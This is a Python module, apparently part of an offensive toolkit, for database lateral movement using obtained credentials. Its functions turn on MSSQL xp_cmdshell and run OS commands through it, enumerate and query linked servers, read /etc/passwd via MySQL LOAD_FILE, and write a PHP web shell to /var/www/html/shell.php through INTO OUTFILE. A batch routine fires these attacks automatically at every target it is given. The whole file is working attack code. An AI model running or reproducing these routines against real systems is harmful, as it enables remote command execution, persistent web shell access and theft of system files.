import subprocess
from typing import Dict, List

from tools.log_utils import get_logger

logger = get_logger("db_lateral")


def mssql_linked_server_query(host: str, user: str, password: str,
                               query: str = "SELECT @@VERSION",
                               linked_server: str = "") -> Dict:
    result = {"success": False, "rows": []}
    try:
        import pymssql
        conn = pymssql.connect(host=host, user=user, password=password, timeout=5)
        cursor = conn.cursor()
        if linked_server:
            fq = f"SELECT * FROM OPENQUERY([{linked_server}], '{query}')"
        else:
            fq = query
        cursor.execute(fq)
        for row in cursor.fetchall():
            result["rows"].append(str(row)[:200])
        conn.close()
        result["success"] = True
    except ImportError:
        cmds = [
            f"sqsh -S {host} -U {user} -P {password} -W -w 999 -C \"{query}\"",
            f"sqlcmd -S {host} -U {user} -P {password} -Q \"{query}\" -W -w 999",
        ]
        for cmd in cmds:
            try:
                r = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=15)
                if r.returncode == 0 and r.stdout.strip():
                    result["success"] = True
                    result["rows"] = [l.strip() for l in r.stdout.split("\n") if l.strip()][:20]
                    break
            except Exception:
                continue
    except Exception as e:
        result["error"] = str(e)
    return result


def mssql_enable_xp_cmdshell(host: str, user: str, password: str) -> Dict:
    result = {"success": False}
    try:
        import pymssql
        conn = pymssql.connect(host=host, user=user, password=password, timeout=5)
        cursor = conn.cursor()
        cursor.execute("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
        cursor.execute("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
        conn.commit()
        cursor.execute("SELECT @@VERSION")
        row = cursor.fetchone()
        result["success"] = True
        result["version"] = str(row[0])[:100] if row else "enabled"
        conn.close()
    except ImportError:
        cmds = [
            f"sqsh -S {host} -U {user} -P {password} -C \"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\"",
        ]
        for cmd in cmds:
            try:
                r = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=15)
                result["success"] = r.returncode == 0
            except Exception:
                continue
    except Exception as e:
        result["error"] = str(e)
    return result


def mssql_cmdshell(host: str, user: str, password: str,
                    command: str) -> Dict:
    result = {"success": False, "output": ""}
    enable = mssql_enable_xp_cmdshell(host, user, password)
    if not enable["success"]:
        return result
    try:
        import pymssql
        conn = pymssql.connect(host=host, user=user, password=password, timeout=5)
        cursor = conn.cursor()
        cursor.execute(f"EXEC xp_cmdshell '{command}'")
        for row in cursor.fetchall():
            val = row[0]
            if val:
                result["output"] += str(val) + "\n"
        conn.close()
        result["success"] = bool(result["output"])
    except Exception as e:
        result["error"] = str(e)
    return result


def mssql_enumerate_linked(host: str, user: str, password: str) -> Dict:
    result = {"success": False, "linked_servers": []}
    try:
        import pymssql
        conn = pymssql.connect(host=host, user=user, password=password, timeout=5)
        cursor = conn.cursor()
        cursor.execute("SELECT SRVNAME FROM sys.servers WHERE is_linked = 1")
        for row in cursor.fetchall():
            result["linked_servers"].append(str(row[0]))
        conn.close()
        result["success"] = len(result["linked_servers"]) > 0
        if result["linked_servers"]:
            for ls in result["linked_servers"]:
                q = mssql_linked_server_query(host, user, password,
                                               query="SELECT @@VERSION",
                                               linked_server=ls)
                if q["success"]:
                    result[f"linked_{ls}_version"] = q["rows"]
    except Exception as e:
        result["error"] = str(e)
    return result


def mysql_into_outfile(host: str, user: str, password: str,
                        query: str = "SELECT '<?php system($_GET[\"c\"]);?>'",
                        outfile: str = "/var/www/html/shell.php") -> Dict:
    result = {"success": False}
    try:
        import pymysql
        conn = pymysql.connect(host=host, user=user, password=password, timeout=5)
        cursor = conn.cursor()
        cursor.execute(f"{query} INTO OUTFILE '{outfile}'")
        conn.commit()
        conn.close()
        result["success"] = True
        result["outfile"] = outfile
    except ImportError:
        try:
            cmd = ["mysql", "-h", host, "-u", user, f"-p{password}",
                   "-e", f"{query} INTO OUTFILE '{outfile}'"]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            result["success"] = r.returncode == 0
            if result["success"]:
                result["outfile"] = outfile
            else:
                result["error"] = r.stderr[:200]
        except Exception as e:
            result["error"] = str(e)
    except Exception as e:
        result["error"] = str(e)
    return result


def mysql_read_file(host: str, user: str, password: str,
                     filepath: str = "/etc/passwd") -> Dict:
    result = {"success": False, "content": ""}
    try:
        import pymysql
        conn = pymysql.connect(host=host, user=user, password=password, timeout=5)
        cursor = conn.cursor()
        cursor.execute(f"SELECT LOAD_FILE('{filepath}')")
        row = cursor.fetchone()
        if row and row[0]:
            result["success"] = True
            result["content"] = row[0][:5000]
        conn.close()
    except Exception as e:
        result["error"] = str(e)
    return result


def postgres_dblink_query(host: str, user: str, password: str,
                           dbname: str = "postgres",
                           query: str = "SELECT version()",
                           remote_host: str = "") -> Dict:
    result = {"success": False, "rows": []}
    try:
        import psycopg2
        conn = psycopg2.connect(host=host, user=user, password=password,
                                 dbname=dbname, connect_timeout=5)
        cursor = conn.cursor()
        if remote_host:
            fq = f"SELECT * FROM dblink('host={remote_host} dbname={dbname} user={user} password={password}', '{query}') AS t(result text)"
        else:
            fq = query
        cursor.execute(fq)
        for row in cursor.fetchall():
            result["rows"].append(str(row)[:200])
        conn.close()
        result["success"] = True
    except Exception as e:
        result["error"] = str(e)
    return result


def scan_database_credentials(creds: List[Dict]) -> List[Dict]:
    results = []
    for entry in creds:
        dtype = entry.get("type", "").lower()
        host = entry.get("host", "127.0.0.1")
        user = entry.get("user", "sa")
        password = entry.get("password", "")
        if dtype in ("mssql", "sqlserver"):
            r = mssql_enumerate_linked(host, user, password)
            if r["success"]:
                r["host"] = host
                r["user"] = user
                results.append(r)
            r2 = mssql_cmdshell(host, user, password, "whoami")
            if r2["success"]:
                results.append({"type": "mssql_cmdshell", "host": host,
                                "user": user, "output": r2["output"]})
        elif dtype in ("mysql",):
            r = mysql_read_file(host, user, password, "/etc/passwd")
            if r["success"]:
                results.append({"type": "mysql_file_read", "host": host,
                                "user": user, "content": r["content"][:200]})
            r2 = mysql_into_outfile(host, user, password)
            if r2["success"]:
                results.append({"type": "mysql_outfile", "host": host,
                                "user": user, "outfile": r2["outfile"]})
    return results
